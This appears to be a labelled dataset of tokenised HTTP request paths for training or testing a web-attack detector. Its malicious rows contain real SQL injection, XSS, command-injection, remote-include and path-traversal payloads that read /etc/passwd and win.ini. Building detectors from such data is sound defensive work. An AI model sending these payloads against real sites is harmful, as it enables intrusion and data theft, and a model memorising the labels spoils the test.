request	label
/ string / strings / parameters = & echo ldmwnx $  (  ( 39 + 93 )  )  $  ( echo ldmwnx ) ldmwnx \  \ 	1
/ scripts / index . php ? option = weblinks & itemid = 2 & catid = -1 union select 0 , 1 , 2 , 709400366843 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 -- 	1
/ string / modo = entrar & login = gahr & pwd = jacerina & remember = off /  & b1 = entrar 	1
/ string / id = 2 /  & nombre = jamn + ibrico & precio = 85 & cantidad = 24 & b1 = aadir + al + carrito 	1
/ sfogarty-d2 / 	0
/ string / strings / parameters = -9922 '  )  )  union all select 2193 , 2193 , 2193 -- 	1
"/ zuihld5m . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 189420 / 	0
/ string / strings / parameters = '  ; echo mhqwaf $  (  ( 29 + 52 )  )  $  ( echo mhqwaf ) mhqwaf ' 	1
"/ cgibin / sawmill ? rfcf +  "" sawmillinfo / sawmillpassword ""  + spbn + 1 , 1 , 21 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 + 3 "	1
/ examples / jsp / jsp2 / jspx / index . php ? op = default & date = 200607 '  union select 1 , 1908404704 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ string / strings / parameters = vilar elsegui 	0
/ string / strings / parameters = &  & echo kxtsxc $  (  ( 16 + 52 )  )  $  ( echo kxtsxc ) kxtsxc | 	1
/ javascript /  . passwd . do 	1
/ javascript / rb . cc 	0
/ y8pmygrp . cgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = lehmann cruanas 	0
/ manager / html ? org . apache . catalina . filters . csrf_nonce = 2deac51318be564dc791daa9b3d06551 	0
/ en-us / account / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ pobierz-560 / 	0
"/ string / strings / parameters = 1 ""  ""  and elt ( 4249 = 4249 , 7259 )  and  ""  "" tmxx ""  ""  =  ""  "" tmxx "	1
/ string / strings / parameters = ;  str =  $  ( echo kmveih )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
"/ zmvq66jy . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ ukswkuyanahsrg1i3fdvwvmvyep5yery / 	0
"/ string / strings / parameters = -1235 ""  ""  )  )  or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  (  (  ""  "" ahhz ""  ""  like  ""  "" ahhz "	1
/ 20061211161009990001 / 	0
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa .  .  .  .  .  .  { file } 	1
/ fo564rei . exe ?  < script > cross_site_scripting . nasl <  / script > 	1
/ cacti / common / visiteurs / include / menus . inc . php ? lvc_include_dir =  / etc / passwd \ x00 	1
/ string / strings / parameters = 1 '  )  )  and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  ' wzrj '  =  ' wzrj 	1
/ string / strings / parameters = 1 %  '  )  )  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) srmq )  and  (  (  '  %  '  =  ' 	1
"/ string / str =  $  ( echo lwoknm )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ safety_ed / 	0
/ examples / servlets / servlet / index . php ? p =  ' nessus 	1
/ 6476401 / 	0
/ userinfo . php ? uid = 1 ; 	1
/ string / strings / parameters = swinkels 	0
/ string / strings / parameters = nolie 	0
/ main . php ? stuff =  ' sleep 9  # 	1
"/ l13b77e5 . pl ?  < script > document . cookie =  "" testjvvf = 7721 ;  ""  <  / script > "	1
"/ string / strings / parameters = |   [  9 -ne  $  ( echo znvkix  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ waziristan_war / 	0
/ string / strings / parameters = lasheras canizales 	0
"/ string / strings / parameters = | echo dwscbs $  (  ( 75 + 48 )  )  $  ( echo dwscbs ) dwscbs "" "	1
/ b5xdqgz2 . cgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 09193 	0
/ msadc / samples / selector / showcode . asp ? source =  / msadc / samples /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini 	1
/ 146616 / 	0
/ javascript / eric . do 	0
/ v15034484 / 	0
/ string / strings / parameters = arevalo ,  17 	0
/ 603002220 / 	0
/ string / strings / parameters = sadoyama 	0
/ tacdfipsfkmi / 	0
/ 111862 / 	0
"/ string / modo = registro & login = carolyne & password = 15i7am41t0 & nombre = ramn & apellidos = chambueta + deben & email =  < script > alert (  "" paros ""  )  ;  <  / script >  & dni = 10042805q & direccion = calle + falconera ,  + 173 +  & ciudad = trefacio & cp = 31227 & provincia = salamanca & ntc = 1976494121699035 & b1 = registrar "	1
/ examples / jsp / colors / webcart . cgi ? config = mountain & change = yes & nextpage =  ; id |  & code = phold 	1
/ string / strings / parameters = 1 '  )  )  or elt ( 6272 = 6272 , sleep ( 5 )  )  and  (  (  ' fele '  =  ' fele 	1
/  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  { file } 	1
/ string / strings / parameters = aldemar 	0
/ hac_flightsoff / 	0
/ article3099517 / 	0
/ string / strings / parameters = -5379 '  )  union all select 4294 , 4294 , 4294 -- 	1
/ scripts / check-lom . php ? etcdir = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ? 	1
"/ help . php ? q =  ""  & ver  > q86798622 & rem "	1
/ star wars revenge of the sith script / 	1
/ examples / jsp / error / texis . exe /  ? -dump 	1
"/ hrttz9fj . mscgi ?  < script > document . cookie =  "" testtbjy = 7334 ;  ""  <  / script > "	1
/ rxdwpyc_hli / 	0
/ 85779-01 / 	0
/ string / modo = entrar & login = sparks & pwd = 569t179e & remember = on /  & b1 = entrar 	1
"/ string / strings / parameters = < script > x =  ""  ""  * prompt ( 9 )  *  ""  ""  ; y = 42 ;  <  / script > "	1
/ wxglade / 	0
/ 135197 / 	0
/ string / strings / parameters = 1 '  )  rlike sleep ( 5 ) 	1
/ string / strings / parameters = print (  ` echo bqvixy \ necho  $  (  ( 53 + 95 )  )  \ necho bqvixy \ necho bqvixy `  )  ;  )  } bqvixy 	1
/ zibbarrow / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  union all select null , null , null , null , null , null , null , null -- "	1
"/ string / strings / parameters = 1 ""  ""  )  )  and 6486 = 3843 and  (  (  ""  "" fbka ""  ""  like  ""  "" fbka "	1
"/ phpmyadmin / search . jsp ? q =  %  ""  < script > alert ( 1331923191 )  <  / script > "	1
/ string / strings / parameters = ;  str =  $  ( echo ytykpd )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
/ early_flight / 	0
/ string / str =  $  ( echo okmzve )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ string / strings / parameters = 1013839255415195 	0
/ string / strings / parameters = llena astall 	0
/ string / strings / parameters = |   [  5 -ne  $  ( echo lqrkbx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ string / strings / parameters = 1 )  )  )  and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  and  (  (  ( 1205 = 1205 	1
/ string / strings / parameters = francina 	0
/ voice_home / 	0
/ viewfeed / 	0
/ s7qus4g3 . html ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = ;  str =  $  ( echo iboovb )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
"/ string / strings / parameters = < textarea name =  ' file ""  ;  filename =  "" test .  < img src = a onerror = document & amp ;  # 46 ; location & amp ;  # 61 ;  & amp ;  # 34 ; http :  & amp ;  # 47 ;  & amp ;  # 47 ; evil & amp ;  # 46 ; site & amp ;  # 34 ;  >  '  > "	1
/ 24841950 / 	0
/ cgi-local / ion-p ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ examples / jsp / num / module . php ? module = osticket & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ string / strings / parameters = 1 ""  ""  )  as bksv where 5375 = 5375 ; select  ( case when  ( 4660 = 4660 )  then 4660 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual -- "	1
/ string / strings / parameters = )  ;  } print (  ` echo bcmroj ; echo  $  (  ( 2 + 69 )  )  ; echo bcmroj ; echo bcmroj `  )  ;  .  ' bcmroj 	1
"/ 0rufe52p . do ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / firewall . xsl 	0
/ ksmobilesales / 	0
/ xprrpc_why / 	0
/ string / strings / parameters = -2962 '  )  )  )  or 1570 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  ' hkjo '  =  ' hkjo 	1
/ javascript / computer . swf 	0
/ string / strings / parameters = mamukos4 @ culturalsanpedrocf . uk 	0
/ string / strings / parameters = gomero gallardo 	0
/ find-off / 	0
"/ jnv890lt . cgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / adm . pfx 	0
/ javascript / 12 . exe 	1
/ 001875 / 	0
/ 00000780 / 	0
/ string / strings / parameters = alhendn 	0
"/ nyjgaorz . do ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 1 )  as wype where 6608 = 6608 or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- 	1
/ string / strings / parameters = rohtert 	0
/ desktop_01 / 	0
"/ help . php ? q =  ""  & del \ x09q44432678 \ x09 # "	1
/ string / strings / parameters = ;  str =  $  ( echo kumdme )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
/ hiking-shoes / 	0
/ string / strings / parameters = 5400 	0
/ string / strings / parameters = saladich bar 	0
/ javascript / document . pem 	1
/ andrew-barrow / 	0
/ 2124758 / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  or extractvalue ( 1297 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 1297 = 1297 , 1 )  )  )  , 0x717a767a71 )  )  and  (  (  ""  "" pebw ""  ""  like  ""  "" pebw "	1
/ cache-212x70 / 	0
/ string / strings / parameters = -7267 )  union all select 1912 , 1912 , 1912 , 1912 , 1912 , 1912 , 1912 , 1912 -- 	1
/ help . php ? q =  '  & sleep 8  # 	1
/ string / strings / parameters = 8arrascal485 	0
/ richard pryor-live on the sunset strip mentalrg / 	0
/ templates / documents /  ? d = a 	0
/ string / strings / parameters = 1 + and + length ( 123 )  = 3 	1
/ string / strings / parameters = 1 '  where 8437 = 8437 and make_set ( 8403 = 8403 , 8899 )  -- 	1
/ manager / main . php ? g2_view = zipcart . download & g2_file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = caamao alayo 	0
/ j2kdmfw4 . kspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ manager / index . php ? op = default & date = 200607 '  union select 1 , 1128524552 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ 20061213-8411 / 	0
"/ 7u1pb2xi . do ?  < meta http-equiv = set-cookie content =  "" testlwwz = 718 ""  > "	1
/ string / strings / parameters = 1 )  or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  ) 	1
/ install / installwizard . aspx 	0
/ sertap-ask olmez / 	0
/ javascript / test-env . exe 	1
/ string / strings / parameters = meeks 	0
/ bloodfruit1 / 	0
/ enquiry_rajasthan / 	0
"/ main . php ? logout =  ""  & ping \ x0b-w \ x0b8000 \ x0b-n \ x0b1 \ x0b4 . 3 . 2 . 1 & rem \ x0b "	1
/ 2171867 / 	0
/ grub-faq / 	0
"/ 7u1pb2xi . pl ?  < script > document . cookie =  "" testlwwz = 718 ;  ""  <  / script > "	1
/ examples / jsp / cal / admin / components / com_fm / fm . install . php ? lm_absolute_path =  .  .  /  .  .  /  .  .  /  & install_dir = limbo_com_fm_php_shell . nasl-1331904435 	1
/ 149562 / 	0
/ string / modo = insertar & precio = any ?   set-cookie :  + tamper = 1041264011025374727 & b1 = confirmar 	1
/ 183049782 / 	0
/ truecrypt-confiabilidad / 	0
/ powerkills / 	0
/ string / strings / parameters = and  ( select substring (  @  @ version , 1 , 1 )  )  =  ' x ' 	1
/ string / strings / parameters = '  ;  str =  $  ( echo zahuzd )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
"/ raanw4ia . php ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ spiral23 / 	0
/ string / strings / parameters = or 0 = 0  # 	1
"/ xsqln7eb . exe ?  < meta http-equiv = set-cookie content =  "" testpcbb = 9254 ""  > "	1
/ javascript / document . out 	1
/ invest_vienna / 	0
"/ string / strings / parameters = < meta http-equiv =  "" link ""  content =  ""  < javascript : alert (  ' xss '  )  >  ;  rel = stylesheet ""  > "	1
/ scripts / index . php ? op = default & date = 200607 '  union select 1 , 1409814507 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ string / strings / parameters = >  hashdum 	1
/ 748_949 / 	0
/ 002799 / 	0
